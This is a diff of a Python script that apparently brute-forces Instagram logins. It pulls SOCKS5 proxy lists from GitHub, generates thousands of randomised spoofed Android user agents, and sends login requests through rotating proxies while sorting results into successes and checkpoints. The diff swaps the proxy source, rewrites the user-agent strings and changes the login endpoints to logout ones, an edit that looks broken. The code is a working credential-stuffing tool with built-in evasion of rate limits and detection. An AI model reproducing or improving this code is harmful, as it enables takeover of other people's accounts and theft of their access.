@@ -71,7 +71,7 @@ try:
 except:
     pass
 try:
-    prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt').text
     open('.prox.txt','w').write(prox)
 except Exception as e:
     print('GAGAL')
@@ -118,7 +118,7 @@ def waktu():
 
 #---------------------[ USER-AGENT ]--------------------#
 
-USN="Mozilla/5.0 (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (27/8.1.0; 320dpi; 720x1384; samsung; SM-J410G; j4corelte; qcom; pt_BR; 430370687)"
+USN="Instagram (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (27/8.1.0; 320dpi; 720x1384; samsung; SM-J410G; j4corelte; qcom; pt_BR; 430370687)"
 internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
 follower=[]
 uasm = []
@@ -134,30 +134,30 @@ for x in range(1000):
 	rr = random.randint
 	rc = random.choice
 	aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
-	ugent1 = f"Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,11))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36"
+	ugent1 = f"Instagram (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,11))} Build/PPR1.{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36"
 	if ugent1 in uasm:pass
 	else:uasm.append(ugent1)
-	ugent2 = f"Mozilla/5.0 (Linux; U; Android {str(rr(8,10))}; Redmi Note {str(rr(5,11))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2  Mobile Safari/537.36"
+	ugent2 = f"Instagram (Linux; U; Android {str(rr(8,10))}; Redmi Note {str(rr(5,11))} Build/PKQ1.{str(rr(111111,199999))}.00{str(rr(1,9))} AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.{str(rr(1111,6666))}.2  Mobile Safari/537.36"
 	if ugent2 in uasm:pass
 	else:uasm.append(ugent2)
-	ugent3 = f"Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 "
+	ugent3 = f"Instagram (Linux; U; Android {str(rr(7,12))}; SM-{str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 "
 	if ugent3 in uasm:pass
 	else:uasm.append(ugent3)
 	
 for sora in range(1000):
     rr = random.randint
     rc = random.choice
-    uazku1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku2 = f"Mozilla/5.0 (Linux; Android {str(rr(1,5))}.{str(rr(1,5))}.{str(rr(1,3))}; en-US; ADVAN S4A Build/ADVAN) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/534.30"
-    uazku3 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku4 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku5 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku6 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku7 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku8 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku9 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku10 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
-    uazku11 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku1 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku2 = f"Instagram (Linux; Android {str(rr(1,5))}.{str(rr(1,5))}.{str(rr(1,3))}; en-US; ADVAN S4A Build/ADVAN) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/534.30"
+    uazku3 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku4 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku5 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku6 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku7 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku8 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku9 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku10 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(1,10))}.{str(rr(1,5))}.0.{str(rr(10,535))} U3/0.{str(rr(1,8))}.0 Mobile Safari/537.36 GNews Android/2022118446"
+    uazku11 = f"Instagram (Linux; Android {str(rr(9,12))}; CPH2271 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446"
     uasor = str(rc([uazku1, uazku2, uazku3,uazku4,uazku5,uazku6,uazku7,uazku8,uazku9,uazku10,uazku11]))
     baru.append(uasor)
 
@@ -640,7 +640,7 @@ class instagram:
                 proxs= {'http': 'socks5://'+nip}
                 ua2 =random.choice(uasm)
                 ua = random.choice(baru)
-                token=s.get('https://z-p42.www.instagram.com/accounts/login/ajax/')
+                token=s.get('https://z-p42.www.instagram.com/accounts/logout/ajax/')
                 headers = {
                     'Host': 'z-p42.www.instagram.com',
                     'Connection': 'keep-alive',
@@ -668,7 +668,7 @@ class instagram:
                     "queryParams": {},
                     "stopDeletionNonce": "",
                     "trustedDeviceRecords": {}}
-                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,allow_redirects=True,proxies=proxs)
+                x=s.post("https://www.instagram.com/accounts/logout/ajax/",headers=headers,data=param,allow_redirects=True,proxies=proxs)
                 x_jason=json.loads(x.text)
                 if "userId" in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
